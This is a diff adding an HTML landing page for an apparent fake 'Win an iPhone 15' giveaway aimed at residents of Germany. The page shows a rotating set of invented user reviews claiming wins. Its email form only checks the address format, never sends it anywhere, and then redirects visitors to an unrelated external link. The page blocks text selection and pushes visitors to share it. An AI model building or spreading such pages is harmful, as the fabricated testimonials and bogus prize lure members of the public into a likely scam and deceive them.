@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>iPhone 15 Giveaway</title>
+<style>
+  /* Global resets and UX smoothing */
+  * {
+    user-select: none;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    -webkit-tap-highlight-color: transparent;
+    -webkit-touch-callout: none;
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: linear-gradient(135deg, #0a0f27, #1b3a6b, #0a0f27);
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  .top-bar {
+    width: 100%;
+    padding: 16px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: sticky;
+    top: 0;
+    background: rgba(255, 255, 255, 0.05);
+    backdrop-filter: blur(10px);
+    z-index: 1000;
+  }
+
+  .share-btn {
+    padding: 10px 18px;
+    background-color: #000;
+    color: white;
+    border: none;
+    border-radius: 999px;
+    font-size: 16px;
+    cursor: pointer;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    transition: transform 0.1s ease;
+  }
+
+  .share-btn:hover {
+    transform: scale(1.03);
+  }
+
+  .time {
+    padding: 8px 16px;
+    background: rgba(0, 0, 0, 0.4);
+    backdrop-filter: blur(10px);
+    border-radius: 12px;
+    color: #fff;
+    font-weight: 600;
+    font-size: 16px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+  }
+
+  .hero {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 60px 20px 100px;
+    background: transparent;
+  }
+
+  .hero-glass {
+    background: rgba(0, 0, 0, 0.55);
+    backdrop-filter: blur(12px);
+    padding: 40px;
+    border-radius: 20px;
+    max-width: 500px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+    color: #fff;
+    position: relative;
+  }
+
+  .hero-glass img {
+    max-width: 150px;
+    margin-bottom: 20px;
+    border-radius: 20px;
+    user-select: none;
+    pointer-events: none;
+  }
+
+  .hero-glass h1 {
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+
+  .hero-glass p {
+    font-size: 1rem;
+    opacity: 0.85;
+    margin-bottom: 20px;
+    line-height: 1.4;
+  }
+
+  .hero-glass input {
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    margin-bottom: 8px;
+    outline: none;
+    user-select: text;
+  }
+
+  .hero-glass button {
+    width: 100%;
+    padding: 12px 16px;
+    border-radius: 12px;
+    border: none;
+    background: #007aff;
+    color: white;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s ease;
+    user-select: none;
+  }
+
+  .hero-glass button:hover {
+    background: #005fc1;
+  }
+
+  .error-msg {
+    color: #ff4d4f;
+    background: rgba(255, 77, 79, 0.15);
+    padding: 8px 12px;
+    border-radius: 12px;
+    font-size: 0.9rem;
+    margin-bottom: 12px;
+    user-select: none;
+    box-shadow: 0 0 5px #ff4d4f;
+  }
+
+  /* Language Modal */
+  #languageModal {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.75);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 2000;
+    user-select: none;
+  }
+
+  #languageModal .modal-content {
+    background: rgba(10, 15, 39, 0.9);
+    border-radius: 20px;
+    padding: 30px 40px;
+    width: 320px;
+    max-width: 90vw;
+    text-align: center;
+    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
+    color: #fff;
+  }
+
+  #languageModal h2 {
+    margin-bottom: 24px;
+    font-weight: 700;
+    font-size: 1.5rem;
+    user-select: none;
+  }
+
+  #languageModal .lang-btn {
+    background: #007aff;
+    border: none;
+    border-radius: 999px;
+    color: white;
+    padding: 14px 30px;
+    font-weight: 700;
+    font-size: 1rem;
+    margin: 0 12px;
+    cursor: pointer;
+    transition: background 0.25s ease;
+    user-select: none;
+    width: 120px;
+  }
+
+  #languageModal .lang-btn:hover {
+    background: #005fc1;
+  }
+
+  body.modal-open {
+    overflow: hidden;
+  }
+
+  /* Reviews Section (Rotating) */
+  .reviews {
+    padding: 40px 20px;
+    background: #f9f9f9;
+    text-align: center;
+    font-family: 'Helvetica Neue', sans-serif;
+  }
+
+  .reviews h2 {
+    font-size: 24px;
+    margin-bottom: 20px;
+    color: black;
+  }
+
+  .review-carousel {
+    max-width: 600px;
+    margin: auto;
+    min-height: 160px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .review-card {
+    background: white;
+    border-radius: 20px;
+    padding: 25px;
+    box-shadow: 0 5px 30px rgba(0, 0, 0, 0.08);
+    transition: all 0.3s ease;
+    width: 100%;
+    max-width: 500px;
+  }
+
+  .review-card .stars {
+    color: #FFD700;
+    font-size: 20px;
+    margin-bottom: 10px;
+  }
+
+  .review-card.animated {
+    animation: fadeInUp 0.6s ease-in-out;
+  }
+
+  @keyframes fadeInUp {
+    from {
+      transform: translateY(20px);
+      opacity: 0;
+    }
+    to {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  }
+  .review-card {
+  background: white;
+  border-radius: 20px;
+  padding: 25px;
+  box-shadow: 0 5px 30px rgba(0,0,0,0.08);
+  transition: all 0.3s ease;
+  width: 100%;
+  max-width: 500px;
+  color: #111; /* ✅ Add this line for black text */
+}
+
+.review-card p {
+  color: #111; /* ✅ Ensure review text is dark */
+  font-size: 16px;
+  line-height: 1.5;
+}
+.review-card {
+  background: white;
+  border-radius: 24px; /* ← Make edges more curved */
+  padding: 25px;
+  box-shadow: 0 5px 30px rgba(0, 0, 0, 0.08);
+  transition: all 0.3s ease;
+  width: 100%;
+  max-width: 500px;
+  color: #111;
+}
+</style>
+</head>
+<body>
+
+  <!-- Sticky Header -->
+  <div class="top-bar">
+    <button class="share-btn" onclick="sharePage()">Share</button>
+    <div class="time" id="time">00:00:00</div>
+  </div>
+<!-- Hero Section -->
+<div class="hero">
+  <div class="hero-glass">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ7FwnrDJrFD8vtph-S4ahy-LQPxrgWe7s3i1nn6fhb2DgZkyZtt9N6Uew&s=10" alt="iPhone 15" />
+    <h1 id="title">Win an iPhone 15</h1>
+    <p id="description">Just enter your email and join the giveaway – no purchase needed.<br>Open to residents of Germany, 18+ only.</p>
+    <input type="email" id="email" placeholder="Enter your email" aria-label="Email" />
+    <div id="errorMsg" class="error-msg" style="display:none;">Please enter a valid email address.</div>
+    <button onclick="submitEmail()">Enter Now</button>
+  </div>
+</div>
+
+<!-- Reviews Section -->
+<div class="reviews">
+  <h2>What People Are Saying</h2>
+  <div class="review-carousel" id="reviewCarousel">
+    <!-- Reviews will rotate here -->
+  </div>
+</div>
+  <!-- Language Modal -->
+  <div id="languageModal" aria-modal="true" role="dialog" aria-labelledby="langModalTitle" aria-describedby="langModalDesc">
+    <div class="modal-content">
+      <h2 id="langModalTitle">Choose your language / Wähle deine Sprache</h2>
+      <button class="lang-btn" onclick="setLanguage('en')">English</button>
+      <button class="lang-btn" onclick="setLanguage('de')">Deutsch</button>
+    </div>
+  </div>
+<script>
+  const reviews = [
+    { stars: 5, text: "I actually won the iPhone 15! Insane. Thank you! 🙌", user: "– Julia M." },
+    { stars: 4, text: "Just joined. This looks super clean and real.", user: "– Leon S." },
+    { stars: 5, text: "Can't wait! Entered in 10 seconds. Hope I win!", user: "– Mia D." },
+    { stars: 4, text: "My friend won last month. I'm next 😎", user: "– Kevin B." },
+    { stars: 5, text: "Got my confirmation – fingers crossed 🤞", user: "– Yasmin R." },
+    { stars: 4, text: "Smooth and easy. No sketchy stuff. Love it!", user: "– Nico T." },
+    { stars: 5, text: "Wasn’t expecting it, but I won 😭💖!", user: "– Sarah W." },
+    { stars: 5, text: "I’m telling everyone to join. This is 🔥", user: "– Elias H." }
+  ];
+
+  let currentReview = 0;
+  const container = document.getElementById("reviewCarousel");
+
+  function renderReview(index) {
+    const review = reviews[index];
+    const stars = "★".repeat(review.stars) + "☆".repeat(5 - review.stars);
+    container.innerHTML = `
+      <div class="review-card animated">
+        <div class="stars">${stars}</div>
+        <p>"${review.text}"<br><strong>${review.user}</strong></p>
+      </div>
+    `;
+  }
+
+  renderReview(currentReview);
+  setInterval(() => {
+    currentReview = (currentReview + 1) % reviews.length;
+    renderReview(currentReview);
+  }, 4000);
+</script>
+<script>
+  // Disable text selection for body except input (just a safeguard)
+  document.body.addEventListener('selectstart', e => {
+    if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+      e.preventDefault();
+    }
+  });
+
+  // Share API
+  function sharePage() {
+    if (navigator.share) {
+      navigator.share({
+        title: document.title,
+        text: "Check this out!",
+        url: window.location.href
+      }).catch(err => console.log("Sharing failed:", err));
+    } else {
+      alert("Sharing not supported on this browser.");
+    }
+  }
+
+  // Clock update
+  function updateTime() {
+    const now = new Date();
+    const timeString = now.toLocaleTimeString('en-US', { hour12: false });
+    document.getElementById('time').textContent = timeString;
+  }
+  setInterval(updateTime, 1000);
+  updateTime();
+
+  // Email submit with inline error
+  function submitEmail() {
+    const emailInput = document.getElementById('email');
+    const errorMsg = document.getElementById('errorMsg');
+    const email = emailInput.value.trim();
+    const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    if (!isValid) {
+      errorMsg.style.display = 'block';
+      emailInput.focus();
+      return;
+    }
+    errorMsg.style.display = 'none';
+
+    // Redirect
+    window.location.href = "https://wait-page.eu/a/Vgr2Fky4fz6QO";
+  }
+
+  // Language modal logic
+  const modal = document.getElementById('languageModal');
+  const titleEl = document.getElementById('title');
+  const descEl = document.getElementById('description');
+
+  // Prevent scroll behind modal
+  document.body.classList.add('modal-open');
+
+  function setLanguage(lang) {
+    if (lang === 'de') {
+      titleEl.textContent = 'Gewinne ein iPhone 15';
+      descEl.innerHTML = 'Gib einfach deine E-Mail ein und nimm am Gewinnspiel teil – kein Kauf nötig.<br>Teilnahme nur für Deutschland, ab 18 Jahren.';
+    } else {
+      titleEl.textContent = 'Win an iPhone 15';
+      descEl.innerHTML = 'Just enter your email and join the giveaway – no purchase needed.<br>Open to residents of Germany, 18+ only.';
+    }
+    modal.style.display = 'none';
+    document.body.classList.remove('modal-open');
+  }
+
+  // Show modal on every page load
+  window.onload = () => {
+    modal.style.display = 'flex';
+    document.body.classList.add('modal-open');
+  };
+</script>
+
+</body>
+</html>
